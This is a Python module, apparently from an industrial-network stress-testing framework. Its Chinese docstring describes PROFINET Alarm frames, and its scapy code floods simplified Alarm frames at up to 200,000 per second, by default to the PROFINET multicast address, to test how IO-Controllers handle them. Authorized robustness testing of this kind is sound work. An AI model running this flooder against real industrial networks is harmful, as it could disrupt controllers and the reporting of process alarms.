"""
測項：PROFINET Alarm 通知訊框注入風暴
分類：PROFINET（Layer 2，EtherType 0x8892）
說明：PROFINET 的 Alarm（警報）機制是 IO-Device 通知 IO-Controller 發生事件
（模組插拔、診斷警報、製程警報等）的即時通道，使用保留的 FrameID：
Alarm High（高優先權）= 0xFC01、Alarm Low（低優先權）= 0xFE01（依公開的
PROFINET 協定實作參考文件，如開源 IO-Device 協定堆疊 p-net 原始碼中對應常數）。
IO-Controller 端必須即時處理送入的 Alarm 通知（回覆 Alarm-Ack、更新診斷狀態、
必要時觸發上層應用告警），這條路徑與 profinet/dcp_flood.py（組態探索）、
profinet/rt_cyclic_flood.py（週期性製程資料）、profinet/cm_connect_churn.py
（連線建立）三者都是不同的協定分工與失效面向。

限制說明（與 profinet/cm_connect_churn.py 的立場一致）：目前 Python
生態圈沒有現成、可直接組出完整合規 AlarmNotification-PDU 的函式庫（scapy 沒有
內建完整的 PROFINET Alarm layer，完整 PDU 需要巢狀的 AlarmType/ApiAdd/Slot/
Subslot/ModuleIdent/SubmoduleIdent/AlarmSpecifier 等欄位並與目標裝置實際模組
組態相符）。本測項僅依規範「盡力」組出正確的 FrameID + 一個簡化版 Alarm 資料區
（不含完整合規欄位內容），因此對真實裝置而言可能會被判定格式不完整並回覆
Alarm-Nack 或直接忽略——這是預期且可接受的結果。此測項的目的不是「觸發一個
語意正確的警報事件」，而是測試 IO-Controller/IO-Device 的 Alarm 接收路徑對
「高頻率、格式相似但不保證完整」的 Alarm 訊框之輸入驗證健全性與資源回收行為
（是否會因為每次收到都配置暫存的 Alarm 佇列資源、快速重複送出造成佇列/記憶體
緩慢增長，或影響其他正常 Alarm 事件的即時通報）。如需嚴謹、語意正確的 Alarm
層測試，建議改用廠商工具（如 Siemens PRONETA/TIA）或專用 PROFINET 測試儀。

重要限制：同其他 PROFINET/EtherCAT L2 測項，僅能在受測、已授權的隔離實體網段上
執行；target 欄位僅供記錄，實際發送對象由 dst_mac 決定（預設沿用 DCP 使用的
PROFINET 多播位址，缺乏明確 IO-Controller MAC 時的常見替代做法；如已知實際
IO-Controller MAC，建議改填單播位址以限縮影響範圍）。
需求：scapy、且需要 root 或 CAP_NET_RAW 權限。
"""
import struct
import time

from ..common import RateLimiter, clamp_duration

NAME = "PROFINET Alarm 通知訊框注入風暴"
CATEGORY = "PROFINET"
PROTOCOL = "L2"
TEST_TYPE = "traffic"  # 流量型：高頻率 Alarm 訊框注入，靠請求頻率造成 Alarm 接收路徑負擔

FRAME_ID_ALARM_HIGH = 0xFC01
FRAME_ID_ALARM_LOW = 0xFE01


def get_param_schema() -> dict:
    return {
        "iface": {"type": "string", "default": "eth0", "desc": "發送用網路介面"},
        "dst_mac": {
            "type": "string", "default": "01:0e:cf:00:00:00",
            "desc": "目的 MAC（預設沿用 DCP 多播位址；已知 IO-Controller 實際 MAC 時建議改填單播位址）",
        },
        "priority": {"type": "string", "default": "high", "desc": "警報優先權：high（0xFC01）或 low（0xFE01）"},
        "rate_pps": {"type": "int", "default": 200000, "min": 1, "max": 200000, "desc": "每秒送出 Alarm 訊框數"},
    }


def _build_alarm_payload(seq: int, api: int = 0, slot: int = 1, subslot: int = 1) -> bytes:
    """組出簡化版 Alarm 資料區（見上方 docstring 限制說明：非完整合規 PDU）。
    欄位排列參考 AlarmNotification-PDU 的欄位順序，僅填入結構性 placeholder 資料，
    重點是讓封包在 FrameID 與大致欄位長度上「看起來像」一筆 Alarm 通知，藉此測試
    接收路徑的解析/資源配置行為，而非要求裝置真正接受並上報這筆警報。
    """
    alarm_type = 0x0001  # AlarmType：1 = Process Alarm（示範用）
    api_add = api
    slot_number = slot
    subslot_number = subslot
    module_ident = 0x00000000
    submodule_ident = 0x00000000
    alarm_specifier = seq & 0xFFFF
    return struct.pack(
        ">HIHHIIH",
        alarm_type, api_add, slot_number, subslot_number,
        module_ident, submodule_ident, alarm_specifier,
    )


def run(target, port, protocol, duration, params, stop_event, log_fn):
    try:
        from scapy.all import Ether, Raw, sendp
    except ImportError:
        log_fn("[!] 未安裝 scapy，請先執行 pip install scapy")
        return {"frames_sent": 0, "error": "scapy not installed"}

    duration = clamp_duration(duration)
    iface = params.get("iface", "eth0")
    dst_mac = params.get("dst_mac", "01:0e:cf:00:00:00")
    rate = int(params.get("rate_pps", 4000))
    frame_id = FRAME_ID_ALARM_HIGH if str(params.get("priority", "high")).lower() != "low" else FRAME_ID_ALARM_LOW

    limiter = RateLimiter(rate)
    sent = 0
    seq = 0
    start = time.time()

    log_fn(f"[+] PROFINET Alarm 通知風暴 -> iface={iface}, dst={dst_mac}, "
           f"FrameID=0x{frame_id:04X}, {rate}pps, {duration}s")
    while time.time() - start < duration and not (stop_event and stop_event.is_set()):
        limiter.wait()
        seq += 1
        payload = struct.pack(">H", frame_id) + _build_alarm_payload(seq)
        pkt = Ether(dst=dst_mac, type=0x8892) / Raw(load=payload)
        try:
            sendp(pkt, iface=iface, verbose=False)
            sent += 1
        except (PermissionError, OSError, ValueError) as e:
            # ValueError：scapy 在 iface 參數指向不存在的網路介面時丟出的例外類型，
            # 一併攔截以確保介面名稱打錯字等常見情境也能輸出乾淨的錯誤訊息，
            # 而不是讓例外原始 traceback 冒出來。
            log_fn(f"[!] 發送失敗（權限、介面問題或介面名稱不存在）：{e}")
            break

    return {"frames_sent": sent, "elapsed_sec": round(time.time() - start, 1)}
